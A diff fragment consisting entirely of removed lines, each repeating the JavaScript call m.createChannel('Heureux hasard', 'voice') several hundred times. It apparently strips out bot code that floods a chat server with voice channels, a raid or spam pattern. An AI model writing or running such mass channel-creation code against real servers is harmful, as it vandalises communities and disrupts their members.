-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
-m.createChannel('Heureux hasard', 'voice');
